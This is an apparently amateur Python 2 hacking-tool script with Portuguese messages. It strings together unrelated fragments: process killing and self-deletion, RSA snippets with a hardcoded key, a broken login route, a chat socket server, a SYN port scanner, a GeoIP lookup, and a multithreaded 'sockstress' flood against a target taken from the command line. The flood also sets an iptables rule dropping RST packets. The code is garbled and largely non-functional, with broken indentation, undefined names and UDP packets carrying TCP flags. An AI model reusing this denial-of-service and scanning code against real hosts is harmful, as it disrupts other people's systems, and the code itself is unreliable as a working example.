# -*- coding: utf-8 -*-

"""
Copyright 2018 notbother
Github: @notbother
Facebook: YunkersCrew

Greetz: @v4p0r - @hackerftsg - @fakedocater

"""
import sys
import socket
import select
import hashlib
import requests
import json
from M2Crypto import RSA
from Scripts.RepositoryMemory import RWM
sys.dont_write_bytecode = True


class InssideVerificar(object):

	 def __init__(self, pname):
	 	self.pname = pname
	 	self.processid = RWM.getprocessidbyname(self.pname)
	 	self.hprocess = RWM.openprocess(self.processid)

	 	found = bool(self.hprocess)
        if not found:
        	sys.exit("ERRO. Você não tem acesso ao Script.")


def time():
	import timeit as tempo 
     
    start = tempo.default_timer()
    stop = tempo.default_timer()
      total_tempo = stop - start 
        mins, secs = divmod(total_tempo, 60)
      horas, mins = divmod(mins, 60)
     limite = sys.stdout.write("AVISO. Total de tempo para uso do script %d:%d:%d.\n" % (horas, mins, secs))

def terminar():

	 script = os.path.splitext(os.basename())[0]
       if(mins, secs, horas == 0):
	      os.path.isfile(Script)
          os.remove(Script)
     return mins, secs, horas

    processo = process.communicate(nome)[0]
     for processo in out.splitlines():
         pid = int(processo.split(None, 1)[0])
          os.kill(pid, signal.SIGKILL, nome)

def encryptSniffer():

	TOKEN_ENCRYPTION_KEY = b'\x01\xad\x9b\xc6\x82\xa3\xaa\x93\xa9\xa3\x23\x9a\x86\xd6\xcc\xd9'
      rsa = RSA.load_pub_key("mykey.pub")
      ctxt = rsa.public_encrypt(secretstring, RSA.pkcs1_padding)
           encryptedText = ctxt.encode('base64')
      print TOKEN_ENCRYPTION_KEY+encryptedText
     try: 
          priv = RSA.load_key("mykey.pem")
          decodeEncryptedText = encryptedText.decode('base64')
          ecryptedText = priv.private_decrypt(decodeEncryptedText, RSA.pkcs1_padding)
          print("AVISO. Detectamos o Processo De Sniffer e fechamos ele!")
          self.openprocess(4, 4, 4(".exe"))
     else:
          sys.exit(time.Sleep(2, 3))

def encryptLogin():
    
    @app.route('/login', methods=['POST'])

    username = request.form['username']
          username = Column(String(15), nullable=False, unique=True)
    password = request.form['password']
          password = Column(String(300), nullable=False)

       user = User.find_by_username(username)
    if user and check_password_hash(user.password, password):
        return jsonify({'ERRO.': 'A senha esta incorreta.'})
      return jsonify({'ERROR': 'Usuario ou senha incorretos'}), 401

def __init__(self, username, password, email):
        self.username = username
        self.password = hashlib.sha224(password).hexdigest()

class Chat(object):

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('https://www.livechatinc.com/', 80))
    server_socket.listen(10)

    SOCKET_LIST.append(server_socket)

     while 1:
     	for sock in ready_to_read:
            if sock == server_socket: 
                sockfd, addr = server_socket.accept()
                SOCKET_LIST.append(sockfd)
                print "AVISO. O úsuario (%s, %s) acabou de se conectar ao Insside!" % addr
                 
                broadcast(server_socket, sockfd, "[%s:%s] Entrou na nossa sala de bate-papo!\n" % addr)
             
            else:
                try:
                    data = sock.recv(RECV_BUFFER)
                    if data:
                        broadcast(server_socket, sock, "\r" + '[' + str(sock.getpeername()) + '] ' + data)  
                    else:  
                        if sock in SOCKET_LIST:
                            SOCKET_LIST.remove(sock)
                        broadcast(server_socket, sock, "AVISO. O úsuario (%s, %s) desconectou-se!\n" % addr) 

                except:
                    broadcast(server_socket, sock, "AVISO. O úsuario (%s, %s) está offline!\n" % addr)
                    continue
     for socket in SOCKET_LIST:
        if socket != server_socket and socket != sock :
            try :
                socket.send(message)
            except :
                socket.close()
                if socket in SOCKET_LIST:
                    SOCKET_LIST.remove(socket)

    server_socket.close()
    sys.exit(Chat)

def Scanner():

 IP = socket.gethostname(socket.getbyhostname)

  results = {port:None for port in ports}
    to_reset = []
    p = IP(dst=ip)/TCP(dport=ports, flags='S')
    answers, un_answered = sr(p, timeout=timeout) 
    for req, resp in answers:
        if not resp.haslayer(TCP):
            continue

        IP_layer = resp.getlayer(RECV_BUFFER)

        if IP_layer.flags == 0x12:
            to_reset.append(RECEV_layer.sport)
            results[RECEV_layer.sport] = True

        elif IP_layer.flags == 0x14:
            results[RECEV_layer.sport] = False
    reset_half_open(ip, to_reset)

return results

      start_time = time.time()
    if is_up(ip):
        print "Scanner Iniciado Ao IP %s" % ip
        for ports in chunks(range(1, 1024), 100):
            results = is_open(ip, ports)
            for p, r in results.items():
                print p, ':', r
        duration = time.time()-start_time
        print "IP Capturado >> %f" % (ip, duration)
    else:
print "Não foi possivel Conectar..." 

def GeoIP():

url = 'http://ip-api.com/json/'
IP = raw_input(" [!] Insira o Servidor > ")

   http = requests.get(url+IP)
   content = http.content
   json_data = json.loads(content)
     for i in json_data.keys():
	print (+" : "+str(json_data[i]))

def Stresser():


target = str(sys.argv[1])
dstport = int(sys.argv[2])
threads = int(sys.argv[3])	


 def sockstress(target,dstport):
	while 0 == 0:
		try:
			x = random.randint(0,65535)
			response = sr1(IP(dst=target)/UDP(sport=x,dport=dstport,flags='S'),timeout=1,verbose=0)
			send(IP(dst=target)/UDP(dport=dstport,sport=x,window=0,flags='A',ack=(response[UDP].seq + 1))/'\x00\x00',verbose=0)
		except:
pass
	print '\nPressione CTRL+C!'
	print 'Fixando Tabelas de IPS'
	os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
	sys.exit()

os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
signal.signal(signal.SIGINT, graceful_shutdown)

print "A investida começou ... use Ctrl + C para parar o ataque"
for x in range(0,threads):
	thread.start_new_thread(sockstress, (target,dstport))
while 0 == 0:
sleep(1) 
